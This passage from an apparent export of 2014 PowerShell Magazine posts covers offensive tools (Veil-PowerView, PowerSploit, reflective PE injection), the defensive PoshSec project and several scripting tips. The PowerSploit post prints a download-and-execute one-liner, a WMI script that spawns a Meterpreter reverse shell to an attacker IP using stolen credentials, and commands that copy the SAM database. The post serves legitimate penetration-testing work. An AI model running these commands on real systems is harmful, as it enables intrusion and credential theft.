attack cycle we in the security community call post-exploitation. Once an attacker gains control of a machine, the availability of the PowerShell language provides an excellent environment to perform a variety of actions that can help turn that compromise of that single system into the compromise of an entire domain.\nMatt Graeber‘s post “Why I Choose PowerShell as an Attack Platform“ articulates better than I could why PowerShell is great for post-exploitation. Essentially, Microsoft has given attackers a means to run fully-featured attacker toolsets (or malware) on any modern Windows operating system by providing a whitelisted, AV-safe environment with access to the full .NET Framework. Being able to dynamically load PowerShell scripts into memory without touching disk is an added plus, allowing us as attackers to leave as forensically small a footprint as possible on an exploited machine.\nMy contribution to the offensive PowerShell community, Veil-PowerView, is a component of the open source attack toolkit I co-founded called the Veil-Framework. The toolset started with Veil-Evasion, which generates AV-evading executables, branched into payload delivery with Veil-Catapult, and then moved into situational awareness with Veil-PowerView. As we began to move into more advanced engagements, we began to focus more on PowerShell as a post-exploitation tool; Veil-PowerView is the result of gap areas we encountered between our operational goals and the capabilities of current public tools.\nPowerView’s inspiration initially came from an experience on an assessment where a client had implemented an interesting defense- the disabling of all “net *” commands on domain machines. Initially this threw a wrench in some of our normal post-exploitation activities, however during our post assessment breakdown we started brainstorming ways around this particular defense in case we encountered it again. Bypassing it completely ended up being trivial through the use of PowerShell’s DirectoryServices.ActiveDirectory namespace and Active Directory Service Interfaces:\nPowerView’s _Get-Net*_ cmdlets now handle everything from retrieving the local domain/user, querying Active Directory for domain user and group information, to adding local or domain users and more:\nThis was the initial motivation for the tool, a contingency in case we encountered a situation again where _net.exe_ was disabled. The next phase of development was inspired by Rob Fuller’s _netview.exe_ project, which “utilizes various Windows API calls to perform enumeration across network machines“. PowerView’s port of netview.exe_, Invoke-Netview_, will query Active Directory for machines using ADSI, and then for each machine will enumerate sessions using a Win32-api implementation of NetSessionEnum, logged on users using a Win32-api implementation of NetWkstaUserEnum, and available shares using a Win32-api implementation of NetShareEnum. The Windows API calls were later rewritten using information from Matt Graeber’s post “Accessing the Windows API in PowerShell via internal .NET methods and reflection”. This allows PowerView to operate completely in memory, as it doesn’t rely on csc.exe to temporarily compile C# code in order to access the Windows API.\nFrom there, a few related functions were built to hunt for users on a domain. Invoke-UserHunter will query Active Directory for users of a particular group, say “Domain Admins”, and then utilizes similar techniques as Invoke-Netview to enumerate loggedon users and users with active sessions, matching up where target users are located. Invoke-StealthUserHunter takes a more subtle, ‘red-teamy’ approach to hunting down user locations. It will then extract all servers found from user HomeDirectory entries, and run a Get-NetSessions call against each found file server to get current user sessions on those targets, again matching up where target users are located. Both of these functions are among the most useful for us on security engagements: once we find a way to access target machines, say through local admin password reuse, one of the things that used to be tedious was finding where high value users were logged in. With PowerView, we can now automate and accelerate this previously painful process:\nFrom there, more and more functionality has been added into PowerView as gaps have arisen for us on assessments between what we want to accomplish and the functionality of current toolsets. PowerView can now query AD for machines likely vulnerable to common network exploits, find all available shares on the network readable by the current user, search for sensitive files on target file shares, enumerate local groups/users for some machines, and more. Check out PowerView’s README.md for a complete command listing, and Get-Help for flags and examples for almost all functions.\nPowerShell is an extremely effective attack platform for offensive operations, and is an essential tool for penetration testers and red teamers alike. And we’ve just scratched the surface with current projects- as more attack toolsets are ported to the language we’ll begin to see what’s truly possible with PowerShell from an attacker perspective. There’s a lot the offensive and professional PowerShell communities can learn from each other, and hopefully a collaborative bridge can be built between our two groups.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/14/veil-powerview/","tags":["infosec","security","Modules","Veil-PowerView"],"title":"Veil-PowerView"},{"categories":["InfoSec","Security","Module Spotlight","PoshSec"],"contents":"In March of 2013 I had the desire to create an open source Security Information and Event Management system, also known as a SIEM. I had wanted to create something for small businesses or businesses with the “low-to-no” budget for security. I figured it would take a couple of years to get something ready to push out but I knew I had to start somewhere. I had this great idea to write and bake everything in the SIEM and just make it free to the public to use. I realized that it may not take off and that I may abandon the project as I had done with several other projects in the past. Having written applications that spanned multiple different languages, engines, and industry verticals, I realized that this would be a project that I could really enjoy developing and maintaining.\nPoshSec In June of 2013, I attended a conference called BSides Detroit. At this conference I attended a talk that was presented by Matt Johnson. Matt’s talk was about a project he was working on called PoshSec. Matt recently submitted an article on the history of PoshSec that I encourage you to read.\nPoshSec was short for PowerShell Security. Matt talked about how they were using PowerShell to improve the security posture of organizations with a series of cmdlets and scripts. I loved what he was doing and I was really excited about the project. I realized that what I was attempting to create and what Matt was working on could be combined into a new project.\nI talked with Matt and we discussed one of the biggest entry points in using PowerShell is that, if you are not a script writer or a developer, it can be a bit intimidating. There are also a series of steps that you need to do before you can run your first script. I realized that what I could do is create a bridge for those who are comfortable with a graphical interface while still giving them the power that comes from a PowerShell script or cmdlet.\nIn this article, I will be giving you a brief overview of the PoshSec Framework highlighting some of the features benefits and functionality. It is my hope that this tool will prove useful to you and your team in your environment.\nThe PoshSec Framework is Born After I met with Matt, I went back and scrapped my open source SIEM. Instead of having to bake everything inside of my project I would instead create a project that would leverage the power of PowerShell scripts and functions and provide a graphical interface for displaying that information. Don’t get me wrong, there is still a love for the command line interface. I just know that some members of my team are not that fluent in scripting languages but I wanted to enable them to utilize PowerShell.\nThe PoshSec Framework (psf) is more than a SIEM. It’s more than just a security tool. It ties in many System Administration tasks and allows you to interact with the interface and information through the use of custom PowerShell variables. Yes, you can build form elements within PowerShell, but I wanted to make this extremely easy for those who didn’t want to have to build an entire interface for a simple task.\nA video of an early version of psf showing you the basic commands and functions can be viewed below:\n  The First Time Utility In the first few versions I released, I realized people had a hard time getting their environments set up correctly to use PowerShell, much less psf. Therefore I decided to create a First Time utility in psf. When you run psf for the first time it will go through and do the following steps for you to ensure that your environment is configured properly to use PowerShell:\n  Verify that the settings are correct for psf to function properly. Do an initial download of the PoshSec PowerShell modules from GitHub. Unblock any files that were downloaded. Perform the Update-Help command. Set the Execution-Policy to RemoteSigned.  You have the option of skipping the First Time utility, but this has significantly helped people get PowerShell configured properly so they can begin using scripts and cmdlets as well as psf. I have created a video of the early version of the first time utility that did not have the GitHub download in it. The latest version of psf has full GitHub integration. You can watch that video below.\n  Integrations Syslog One of the features I had to incorporate was writing any alerts that are generated in psf to a Syslog server. Therefore in the logging tab in settings, you can not only write all output and alerts to a file but you can send the alerts to a Syslog server. This means that your PowerShell script can now generate an alert that will go to your existing Syslog server without any heavy lifting in your script.\nIf you set up the Alert Log to use Syslog whenever you call the $PSAlert.Add() method it will not only show up in the Alerts tab but it will also send that same alert to the Syslog you specified.\nGitHub Integration The other feature that I added to psf was direct integration with GitHub. There are so many wonderful community-based PowerShell projects. Especially in the security sector. To make it easy to get those projects, I have enabled a direct API call to GitHub to download the project, unpack it, and make it available in the runspace. You only need to put the URL to the project and select which branch you would like to use; psf does all of the rest of the work.** **\nThe Back-End I created psf to have its own runspace and individual pipelines for each script, function, or command that is run. This means you can run several scripts, commands, or functions at the same time without having to launch a new instance of PowerShell. You can manage those scripts in the scripts tab. I don’t just send a command to the powershell.exe process. I create an entire runspace and process everything in the System.Management.Automation.dll file. This creates a powerful environment for managing scripts and cmdlets.\nThe Layout The initial view of psf has many elements available. You have your domains listed, any systems that were discovered in your scan, a listing of scripts, the listing of PowerShell commands, aliases, and functions, and a section for alerts and active scripts. I even have a tab for a PowerShell command line interface so you can still issue commands via a command line. You can also launch a separate instance of the command prompt or PowerShell with buttons on the toolbar.\nJun\nExposed Elements There are elements of the interface that are directly exposed so that you can access them from within your PowerShell script or cmdlet. This allows you to directly interact with the psf interface without having to build your own form or interface handlers.\nFor example, if you wanted to display a MessageBox in PowerShell, you would need to create a function or cmdlet with code that is similar to the example below.\n[System.Reflection.Assembly]::LoadWithPartialName(“System.Windows.Forms”) [Windows.Forms.MessageBox]::Show(“Hello there PowerShell Magazine Readers!”, “PowerShell Magazine Demo”, [Windows.Forms.MessageBoxButtons]::OK, [Windows.Forms.MessageBoxIcon]::Information)  However, in psf this is the only thing you need to add to your script or cmdlet:\n$PSMessageBox.Show(\"Hello there PowerShell Magazine Readers!\", \"PowerShell Magazine Demo\")  The $PSMessageBox variable is exposed directly through the runspace in psf. You don’t need to initialize or set up anything. Here is that command run directly in psf on the PowerShell tab.\nAnother example is creating a grid view with columns and rows for a PSObject collection. You have the Out-GridView command in PowerShell, but it doesn’t do much more than display the data. In psf, you can create a new tab in the interface with $PSTab. For example, here is how I would put the output of Get-ChildItem on my c:\\psf directory into a grid view and its own tab in psf:\n$PSTab.AddObjectGrid($(Get-ChildItem C:\\psf\\), \"PSF Directory\")  Here is what that looks like in the psf interface. You notice the new “PSF Directory” tab next to Scheduled Scripts.\nThis tab also allows you to export this information as XML, CSV, or raw text. I also expose the computer information listed in the Systems tab with $PSHosts. You can also access the alerts tab with $PSAlerts; as well as create a separate tab just for alerts. There are several other ways you can interact with the interface, but in keeping this article an overview we won’t cover all of them. I have a few other videos that highlight those features here and here.\nScheduling Scripts\nOne of the ways that we utilize psf in our environment is by scheduling our scripts for base-lining and comparison. This way we can track if any new software has been installed, a new user was added to our domain, or even if a system is opening a new port that it hasn’t before. I could have used the built in scheduling system in Windows, however, I wanted to keep everything in psf. Therefore I created a scheduling component to schedule your scripts.** **\nThe nice thing about scheduling through psf is that you can store all of the command or script parameters in the scheduled job; including the selected hosts from the Systems tab. This enables you to set up specific scripts for a group of servers or set up a script if you want to monitor a single box. For example, the three scripts you see above do the following:\n filechanges.ps1 monitors a file and adds an alert for any changes to a specific file. I use this for one of our internal web applications which has built in logging. When the log updates I get an alert in psf as well as through my Syslog server. monitor-startupprograms.ps1 monitors all of my servers start up programs. This ensures that I am aware of any changes to programs that are set to run at start up. monitor-ad-accounts.ps1 monitors my domains for any additions or deletions of any objects. Any changes are set to the alerts as well as my Syslog server.  There is Much More As you can see in this brief overview, the goal of psf is to harness the power of PowerShell and make it available to use in a graphical format. This enables more people to begin utilizing amazing scripts that are being written by the PowerShell community without having to be a script writer or developer. My goal for psf is not to replace the PowerShell CLI or even PowerShell ISE. My goal is to provide a tool to enable PowerShell to be more widely adopted. With the scripts and cmldets written by the PoshSec team, and other people like Carlos Perez (@darkoperator), Matt Graeber (@mattifestation), Chris Campbell (@obscuresec), and Will Schroeder (@harmj0y) I wanted to share their experience and security focus with other organizations to strengthen their overall security landscape.\nThere is more that is being added to psf. It is currently at version 1.0. You can download the source code as well as the binary from the PoshSec GitHub page at https://GitHub.com/poshsec/poshsecframework. Feel free to log any requests, bugs, or issues on our GitHub page.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/11/introduction-to-the-poshsec-framework/","tags":["InfoSec","Security","Modules","PoshSec"],"title":"Introduction to the PoshSec Framework"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or later.\nPowerShell is designed to operate on objects. But, what can we do if all we have is text e.g. from a ticket body or email?\nMy main tool at work is PowerShell ISE and it makes converting text data into custom object relatively easy. I just put my text data in here-string in the Script Pane and let ConvertFrom-Csv do the rest. There are two possible scenarios.\nIn the first one I have pieces of information from the different sources and I can format it as comma-separated values and convert it easily into custom objects:\n@' Name,Department,Title John Doe,Finance,Accountant Marry Jonson,IT,Consultant Andrew Smith,HR,Recruiter '@ | ConvertFrom-Csv  In the second, and more frequent, scenario I have data that looks almost like result from Format-Table. There is no obvious delimiter: few spaces here, one space there. That forces me to clean up the data first, before I can convert it to objects:\n@' Name Status IP WINSRV0001 Production 192.168.100.1 WINSRV0002 Decommissioned 192.168.101.2 LINSRV0001 Racked 192.168.102.2 '@ -replace ' +', ',' | ConvertFrom-Csv  The only limitation is that all properties will be strings, even if they look like numbers:\n$data = @' VM,DiskSizeGB WINVM0001,40 WINVM0003,120 LINVM0004,15 LINVM0005,1100 '@ | ConvertFrom-Csv $data | Get-Member -MemberType Properties TypeName: System.Management.Automation.PSCustomObject Name MemberType Definition ---- ---------- ---------- DiskSizeGB NoteProperty System.String DiskSizeGB=40 VM NoteProperty System.String VM=WINVM0001 This may result in unexpected results when sorting/ filtering:\n$data | Where-Object { $_.DiskSizeGB -gt 100 } | Sort-Object DiskSizeGB VM DiskSizeGB -- ---------- LINVM0005 1100 WINVM0003 120 LINVM0004 15 WINVM0001 40 To fix filtering we have to remember that when comparing PowerShell will always convert value on the right to the type of value on the left. For sorting we have to use a script block and convert property to a number rather than use property as a string type:\n$data | Where-Object { 100 -lt $_.DiskSizeGB } | Sort-Object { [int]$_.DiskSizeGB } VM DiskSizeGB -- ---------- WINVM0003 120 LINVM0005 1100 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/10/pstip-quick-objects-using-convertfrom-csv/","tags":["Tips and Tricks"],"title":"#PSTip Quick objects using ConvertFrom-Csv"},{"categories":["Infosec","Security","Module Spotlight","PoshSec"],"contents":"Security has always been a passion of mine. It was a few short years ago that I was sitting down having a friendly chat with Will Steele. Like me, Will had a passion for security, specially for the filtre de confidentialité pc method but also had a passion for PowerShell. There were quite a few times that Will and I discussed how there was a lack of security-related PowerShell modules. At this time the both of us were looking to get involved in a project and a light went off. We decided that we would create what would become PoshSec.\nIt was around that time that Will unfortunately passed away after a long battle with cancer. I decided then to take the PoshSec torch and run with it. I worked with a few amazing minds on the defensive side of the security industry and worked to craft the project goals and release our first module.\nPoshSec’s Goals The goal of PoshSec has always been to help system administrators, security analysts and many others have a PowerShell-based way to manage the security on their system. With this in mind, there are a few overall goals that PoshSec tries to achieve with each release going forward:\n Provide an avenue to secure, audit, and baseline systems Rely less and less on items that are not built into Windows by default Move the PowerShell community forward into the security space  PoshSec PoshSec from its inception has provided several areas of coverage for managing, auditing, and baselining systems. Originally, PoshSec focused on the CSIS Top 20 controls and provided features that lined up with the various quick win items that the Top 20 list. The Top 20 list can be found at http://csis.org/publication/twenty-important-controls-effective-cyber-defense-and-fisma-compliance. PoshSec has grown since that time and cover areas including forensics and network base lining as well. Currently there are 63 cmdlets/functions in the PoshSec module. We provide coverage for the following areas:\n Account Monitoring \u0026amp; Control Authorized Devices Forensics Log Management Network Baseline Software Management Utility Functions  Let’s go into some of the cmdlets we provide.\nAccount Monitoring and Control When you first look at the items that help with account monitoring and control, you may look at them and say “Hey! The AD module does that already.” I would completely agree. However, the difference is what we provide doesn’t require the AD module or the Active Directory Web service to be installed to function. We utilize the ADSI interface and some .NET classes to provide this functionality. Following one of our stated goal to make things easier for people to use PowerShell to gather this information. This is a huge win for people trying to audit their systems for compliance and for trying to button up the items on the Top 20 control list.\nLog Management An important area for information security professionals as well as system administrators is logs. Logs will always be important and being able to get the information available to the person who needs it is crucial. We current support gathering information about DNS logs and IIS logs. The 1.5 release due out this fall will have additional log types and functionalities that are supported.\nSoftware Management As any good system administrator or analyst can tell you, knowing what is installed on your systems is vital. One of the features we provide is to display the current drivers that are installed on the system. The big win here that we give is the ability to baseline the system to see if anything has changed. The Get-SecDrivers cmdlet allows you to export a CLIXML file with nothing more than specifying the –Baseline switch on the end of the parameter. Below is a screenshot of Get-SecDrivers.\nPoshSec Framework The PoshSec Framework, which will be highlighted in an article later this week by Ben Ten (@ben0xa). The PoshSec PowerShell module is fully integrated with the PoshSec Framework and that takes the overall PoshSec project to a whole new level.\nThe PoshSec Community An old school technology provides direct access to the development team via IRC. You can find the PoshSec team in the #PoshSec room on Freenode. Additionally, you can find quite a few of the security-related PowerShell developers in the #pssec room on Freenode.\nWhere to get PoshSec PoshSec is currently in version 1.0. You can grab a copy at http://github.com/poshsec. We are in a release cadence of twice a year with the next release (version 1.5) coming around in the fall around the infosec cons DerbyCon and GrrCON. We are always welcoming contribution, bug submissions, and feature requests via our GitHub page.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/10/introduction-to-poshsec/","tags":["infosec","security","Modules","PoshSec"],"title":"Introduction to PoshSec"},{"categories":["Tips and Tricks"],"contents":"In my previous tip, I showed some of my favorite methods to convert date time string to the local time. In the same context of RSS feeds, I sometimes find the description text in the RSS feed is HTML-encoded. One example is the Azure service update feed.\n[Reflection.Assembly]::LoadWithPartialName('System.Web') $feed = 'http://azure.microsoft.com/en-us/updates/feed/' $xml = Invoke-RestMethod -Uri $feed $xml[1].description Output from the above snippet differs based on what is the first item in the feed. When I want a readable text, this is not very helpful. So, here is one method I use to decode this string into something that is meaningful to me.\n$xml | Select Title, @{Name='PublicationDate\u0026rsquo;;Expression={[DateTime]$_.PubDate}}, @{Name='Description\u0026rsquo;;Expression={([System.Web.HttpUtility]::HtmlDecode($_.Description)) -replace \u0026ldquo;\u0026lt;.*?\u0026gt;\u0026rdquo;,''}}\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/09/pstip-decoding-an-html-encoded-string/","tags":["Tips and Tricks"],"title":"#PSTip Decoding an HTML-encoded string"},{"categories":["InfoSec","Security"],"contents":"Up until several months ago, I was a member of a penetration test team tasked with compromising data centers and evading detection. Industry standard tools such as Metasploit (an attack toolkit that includes a backdoor named Meterpreter) and Mimikatz (a password dumper) worked well, but I was a paranoid attacker and was worried that running these tools (compiled as unsigned EXE files) would get me detected.\nI started to take a look at PowerShell after reading a blog post by Matt Graeber on launching Meterpreter using PowerShell. Since antivirus pays no attention to PowerShell scripts, I was able to use Meterpreter without launching a suspicious EXE and without having to worry about disabling antivirus.\nI wanted to go a little further though. Instead of just loading Meterpreter, I wanted to be able to load unmanaged DLLs and EXEs (both are actually Windows PE files) without calling LoadLibrary or CreateProcess (because these APIs can be monitored by AppLocker and other similar tools).\nThe solution to this problem was to write my own PE loader. Instead of relying on Windows APIs (LoadLibrary, CreateProcess) to load PE files in memory, I wrote a PowerShell script Invoke-ReflectivePEInjection that roughly recreates the functionality provided by the Windows API. The benefits of Invoke-ReflectivePEInjection are over the Windows APIs are:\n The PE file doesn’t need to be written on disk, it can be supplied as a byte array No logging or application whitelisting will be done on process creation or DLL loads because Windows sees nothing Antivirus will not currently detect this  I gave a short talk at DEF CON on the details of this script that can be found here:\n  I also have several blog posts that dive in the details of the script. I treat Invoke-ReflectivePEInjection like a Swiss Army knife, and have used it to create a few more scripts:\n Invoke-Mimikatz: This combines Invoke-ReflectivePEInjection with Mimikatz to provide an easy to use PowerShell script that can dump the credentials for all users logged in to a system. Invoke-NinjaCopy: This script packages an NTFS file system parser in to a PowerShell script. Sometimes you need access to a file but another process has an exclusive access to the file, preventing you from accessing it. If you are an administrator, you can open a handle to the volume the file is on (ex: C:\\ volume) and parse the NTFS file system data structures manually to identify the location of the raw data you need on the volume. You can then directly copy the data off the volume without ever opening a handle to the file in question. Invoke-NinjaCopy allows you to copy files off of remote systems over PowerShell remoting (meaning you write no files to disk on the remote system). This is useful for attackers and defenders (collecting forensic evidence). More information on this script can be found here. Invoke-CredentialInjection: This is a script that can be used to call the Windows API “LsaLogonUser” from within a process of the attackers choosing. Windows logs which processes are calling the logon APIs and sometimes investigators can detect attacker activity by looking for logons happening from non-standard processes. This script allows an attacker to create a logon originate from any process on the system. For more information about the script and what specifically it is used for, you can read my blog post here.  I have also created scripts unrelated to PE injection.\nOne such script, Invoke-TokenManipulation, allows an administrator to enumerate the logon tokens for all users logged on to the system. It then allows the administrator to create new processes using any of the tokens impersonated (which effectively makes the process run under the other users account, but on the desktop of the administrator who created the process). This script is similar to the tool Incognito. For more information about Invoke-TokenManipulation, see my blog.\nAlthough I no longer do penetration testing against data centers, I do still maintain these tools. Financially motivated or state sponsored attackers can have large budgets for their toolkits, but penetration testers usually do not. For this reason, it is important for penetration testers to have free, quality tools available to test with to simulate the threat of advanced and well-funded adversaries.\nI now work for the Microsoft Security Response Center on the REACT team. I’m responsible for assessing vulnerabilities reported to Microsoft (and 0-days exploited in the wild), finding variants, and doing software penetration tests on high value components. In my new role, I use PowerShell to automate tasks such as configuring servers used for reproducing bugs and automating things such as fuzzing runs.\nAs a final note, all of the tools mentioned above can be found both on my personal GitHub account, and as part of the PowerSploit toolkit.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/09/owning-networks-and-evading-incident-response-with-powershell/","tags":["InfoSec","Security"],"title":"Owning Networks and Evading Incident Response with PowerShell"},{"categories":["Tips and Tricks"],"contents":"Several RSS feeds that I refer regularly have a publication date set to another time zone. For my own tracking purpose, I needed a way to convert it to the local time zone and store the date. There are several ways to do this but the following are my favorite ways of achieving this and in that order.\nUsing DateTime The Parse method of DateTime .NET class can be used in PowerShell to convert between different time zones.\nPS\u0026gt; [DateTime]::Parse('Mon, 07 Jul 2014 18:00:22 +0000') Monday, July 07, 2014 11:30:22 PM PS\u0026gt; [DateTime]::Parse('Thu, 21 Nov 2013 22:40:12 GMT') Friday, November 22, 2013 4:10:12 AM PS\u0026gt; [DateTime]\u0026quot;Mon, 07 Jul 2014 18:00:22 +0000\u0026quot; Monday, July 07, 2014 11:30:22 PM PS\u0026gt; [DateTime]\u0026quot;Thu, 21 Nov 2013 22:40:12 GMT\u0026quot; Friday, November 22, 2013 4:10:12 AM Using TimeZone.CurrentTimeZone We can also use the ToLocalTime method of the TimeZone .NET class:\nPS\u0026gt; [System.TimeZone]::CurrentTimeZone.ToLocalTime('Mon, 07 Jul 2014 18:00:22 +0000') Monday, July 07, 2014 11:30:22 PM PS\u0026gt; [System.TimeZone]::CurrentTimeZone.ToLocalTime('Thu, 21 Nov 2013 22:40:12 GMT') Friday, November 22, 2013 4:10:12 AM What is your favorite way of doing this?\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/08/pstip-converting-to-the-local-time/","tags":["Tips and Tricks"],"title":"#PSTip Converting to the local time"},{"categories":["InfoSec","Security","Module Spotlight","PowerSploit"],"contents":"PowerSploit is an offensive security framework for penetration testers and reverse engineers. It was born out of the realization that PowerShell was the ideal post-exploitation utility in Windows due to its ability to perform a wide range of administrative and low-level tasks all without the need to drop malicious executables to disk, thus, evading antivirus products with ease. PowerSploit is a collection of modules broken down into the following high-level tasks:\n CodeExecution – Perform low-level code execution and code injection. ScriptModification – Modify and/or prepare scripts for execution on a compromised machine. Persistence – Add persistence capabilities to a PowerShell script. PETools – Parse/manipulate Windows portable executables. Capstone – A PowerShell binding for the Capstone Engine disassembly framework. ReverseEngineering – A wide range of reverse engineering tools AntivirusBypass – Defeat AV byte signatures in executables. Exfiltration – Steal sensitive data from a compromised machine. Mayhem – Perform destructive actions. Recon – Tools to aid in the reconnaissance phase of a penetration test  PowerSploit was created by Matt Graeber (@mattifestation) and its current maintainer and primary developer is Chris Campbell (@obscuresec). It has also greatly benefitted by the contributions of Joe Bialek (@JosephBialek) and Rich Lundeen (@RichLundeen).\nPowerSploit’s claim to fame is that it was the first offensive security framework written for PowerShell. However, it’s certainly not the only game in town. Nishang, written by Nikhil Mittal (@nikhil_mitt) and the post-exploitation module in Posh-SecMod written by Carlos Perez (@Carlos_Perez), and Veil-PowerView by Will Schroeder (@harmj0y) are all outstanding alternatives and complements to PowerSploit worth checking out.\nPrior to the inception of PowerSploit, PowerSyringe was developed – a PowerShell implementation of a shellcode injection utility called Syringe. For those unfamiliar with the concept, a shellcode injection utility is a tool that writes and executes a series of malicious assembly language instructions into a targeted process. There are many malicious tasks that shellcode payloads will perform but the most common payload will typically spawn a reverse shell – i.e. connect to an attacker controlled machine from which malicious commands are received and executed.\nAs the desire for more offensive tools increased, and more tools were developed, it was only natural to break out functionality into single ps1 files and package everything into a module while mostly adhering to PowerShell best practices. As more tools were developed and the scope of the project increased it also made more sense to rename the project to something that reflected its evolution into a full-fledged PowerShell-based offensive security framework that offered a subset of the functionality present in MetaSploit. PowerSploit was a natural choice.\nEnough background. Let’s see PowerSploit in action…\nInvoke-ShellcodeMSIL is a variant of Invoke-Shellcode. They are both shellcode execution scripts but Invoke-ShellcodeMSIL was chosen for this example because if the shellcode has a return value, it will be returned to your PowerShell session. This makes for a better demonstration. Invoke-Shellcode is more powerful but it will not return output to the PowerShell session.\nInvoke-ShellcodeMSIL will be used to invoke the following X64 assembly language code:\nMOV RAX, 0x10 MOV RCX, 0x10 ADD RAX, RCX RET  This shellcode simply adds 16 and 16 and returns the sum. The byte representation of the shellcode is seen in the example that follows.\nInvoke-ShellcodeMSIL -Shellcode @(0xB8,16,0,0,0,0xB9,0x10,0,0,0,0x48,1,0xC8,0xC3)  This was just a simple non-malicious proof of concept example but it should serve as a sufficient demonstration of PowerShell’s ability to perform low-level code execution. Now, using the Capstone module in PowerSploit we can disassemble the assembly language code from the previous example.\nGet-CSDisassembly -Architecture X86 -Mode Mode64 -Code @(0xB8,16,0,0,0,0xB9,0x10,0,0,0,0x48,1,0xC8,0xC3) Address Mnemonic Operands ------- -------- -------- 0x00000000 mov eax, 0x10 0x00000005 mov ecx, 0x10 0x0000000A add rax, rcx 0x0000000D ret Invoke-TokenManipulation_ can be used to enumerate available logon tokens on a system and impersonate any one of them. For example, Invoke-TokenManipulation can be used to spawn a process as NT AUTHORITY\\SYSTEM\nInvoke-TokenManipulation -Enumerate Invoke-TokenManipulation -Username 'NT AUTHORITY\\SYSTEM' -CreateProcess cmd.exe  A common post-exploitation task performed is to steal password hashes by obtaining the SAM database on a workstation or the ntds.dit database on a domain controller. These files are locked by the kernel and cannot be accessed using built-in Windows tools. Fortunately, there are two methods of obtaining these files with PowerSploit–Get/Mount-VolumeShadowCopy and Invoke-NinjaCopy.\nThe first example shows how a backed up version of the SAM database can be copied with ease by obtaining it within a mounted volume shadow copy.\nGet-VolumeShadowCopy | Mount-VolumeShadowCopy -Path $PWD cp $PWD\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM  The next example demonstrates Invoke-NinjaCopy being used to extract the live SAM database by getting a handle to the raw disk and carving out the target file from the relevant NTFS data structures.\nInvoke-NinjaCopy -Path C:\\Windows\\System32\\config\\SAM -LocalDestination $PWD\\SAM  There are many other useful tools present in PowerSploit which cannot all be covered in the interest of time. The following tools merit an honorable mention, however:\n Invoke-Mimikatz – Load and execute a strictly memory-resident copy of Mimikatz – a full-featured credential dumping utility Invoke-DllInjection – Inject a malicious DLL into a target process Add-Persistence – Add persistence capabilities to any script or script block Get-GPPPassword – Retrieve plain text group policy preference passwords Get-VaultCredential – Retrieve Windows vault credentials Get-TimedScreenshot – Take screenshots from a victim machine Get-Keystrokes – Keylogger Invoke-Portscan – Port scanner Out-Minidump – Dump process memory to disk for offline analysis and/or credential harvesting Get-PEHeader – Parse PE files on disk and in memory Get-ILDisassembly – A .NET method disassembler Get-Member (proxy function) – Display non-public .NET members by adding the -Private switch to Get-Member Get-Strings – Print human-readable strings from memory Out-EncryptedScript – Script encryption utility Set-CriticalProcess – Cause Windows to blue screen upon exiting the process  Pentesters often ask how to perform the initial infection of a machine with PowerShell and how to go about obtaining and executing PowerSploit scripts on the victim machine. Remote PowerShell code execution can be achieved via the following, non-exhaustive list of techniques:\n PowerShell remoting – Requirements: Remoting must be enabled and the attacker has obtained user credentials WMI – Requirements: WMI service must be running, DCOM ports allowed through the firewall, and administrative credentials (in most cases) PsExec – Requirements: SMB allowed through the firewall and user credentials An exploit – Requirements: Remotely exploitable software and a sufficiently engineered exploit capable of bypassing all enabled exploit mitigations A command injection vulnerability – Requirements: A vulnerable service that fails to sanitize potentially malicious user input and consequently executes the malicious user input  Obtaining and executing malicious PowerSploit functions is made easy in PowerShell with the help of the .NET WebClient class and Invoke-Expression. Once code execution is gained on a victim machine, all the takes is a simple one-liner to download and execute a payload:\npowershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')\"  While this one-liner is ugly and certainly doesn’t conform to a single PowerShell best-practice, it is all an attacker needs to execute any arbitrary code on a compromised machine entirely in memory and all without having to worry about the execution policy.\nTo demonstrate an initial remote compromise in action, we will use WMI, specifically the static Create method of the Win32_Process object to download and execute Invoke-Shellcode on a victim machine for which we have stolen credentials. Once executed, it will connect to the attacker controlled machine and spawn a reverse shell using HTTP as its transport.\n$VictimIP = '192.168.124.130' $AttackerIP = '192.168.124.1' $Hostname = 'WIN-92SPQPW9R24' $Username = 'DevelopersDevelopersDevelopers' $Credential = Get-Credential -Credential \u0026quot;$Hostname\\$Username\u0026quot; # Attacker then enters the password of the user $Command = {Invoke-Shellcode -Payload windows/meterpreter/reverse_http -Lhost $AttackerIP -Lport 80} $InvokeShellcodeUrl = 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1' $PayloadString = \u0026quot;iex(New-Object Net.WebClient).DownloadString('$InvokeShellcodeUrl');$Command\u0026quot; $Parameters = @{ ComputerName = $VictimIP Credential = $Credential Class = 'Win32_Process' Name = 'Create' ArgumentList = \u0026quot;powershell -nop -c $PayloadString\u0026quot; } Invoke-WmiMethod @Parameters As a final note, some astute readers may have noticed that the overwhelming majority of scripts present in PowerSploit are written in PowerShell 2.0 syntax. This is necessary because it is naïve for a pentester to think that an organization will ever have the latest version of PowerShell deployed. At the same time, it is exceedingly unlikely that PowerShell 1.0 will be installed on a machine thus, 2.0 syntax was chosen as the lowest common denominator. Additionally, most scripts in PowerSploit are packaged as individual scripts and they rarely contain any external dependencies. This makes it so that a pentester doesn’t have to download PowerSploit in its entirety to a victim machine. He/she only has to download just enough code to achieve their goal.\nHopefully by now, you have a better understanding of the capabilities of and motivations behind PowerSploit. Happy hacking!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/08/powersploit/","tags":["InfoSec","Security","Modules","PowerSploit"],"title":"PowerSploit"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or later.\nI was looking for a way to find if systems in my environment have PowerShell 4.0 or not. I have a mix of systems with Windows Server 2012, Server 2012 R2, Server 2008 R2, Windows 7, Windows 8, and so on. If I were to check for the hotfix, I need to check different KB numbers for different operating 